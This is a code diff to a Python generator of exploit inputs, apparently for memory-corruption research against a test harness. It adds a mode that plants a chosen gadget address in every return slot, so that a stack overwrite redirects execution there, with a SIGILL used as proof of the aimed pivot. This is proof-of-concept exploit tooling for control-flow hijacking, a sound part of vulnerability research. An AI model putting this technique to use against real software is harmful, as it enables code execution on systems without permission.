@@ -110,8 +110,13 @@ def gen_holder(outdir, dummy=0):
     print("wrote", p, f"({len(req)}-byte request, {N}-local hit-reporting holder)")
 
 
-def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform"):
-    if plants == "distinct":
+def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None):
+    if plants == "gadget" and plant_addr is not None:
+        # aimed pivot: every planted slot = a chosen fixed code address (e.g. a ud2
+        # gadget in the non-PIE harness binary) -> a return-slot overwrite transfers
+        # execution there (SIGILL with PC == the gadget proves the aimed pivot)
+        vals = struct.pack("<Q", plant_addr) * LIVE
+    elif plants == "distinct":
         # per-slot distinct pivot values: a crash PC reveals WHICH slot landed
         vals = b"".join(struct.pack("<Q", 0x0041414100000000 + k) for k in range(LIVE))
     else:
@@ -213,12 +218,14 @@ def main():
                     help="live-value kind: planted qword loads or computed (p1drift shape)")
     ap.add_argument("--dummy", type=int, default=0,
                     help="extra dummy holder locals (live across the call; shifts the holder frame)")
-    ap.add_argument("--plants", choices=["uniform", "distinct"], default="uniform",
-                    help="trigger planted pivot values: all equal or per-slot distinct (slot-ID)")
+    ap.add_argument("--plants", choices=["uniform", "distinct", "gadget"], default="uniform",
+                    help="trigger planted pivot values: all equal, per-slot distinct (slot-ID), or one gadget addr")
+    ap.add_argument("--plant-addr", type=lambda s: int(s, 16), default=None,
+                    help="fixed address planted in every slot when --plants gadget (hex)")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
     gen_holder(args.outdir, args.dummy)
-    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants)
+    gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants, args.plant_addr)
     gen_benign(args.outdir)
 
 
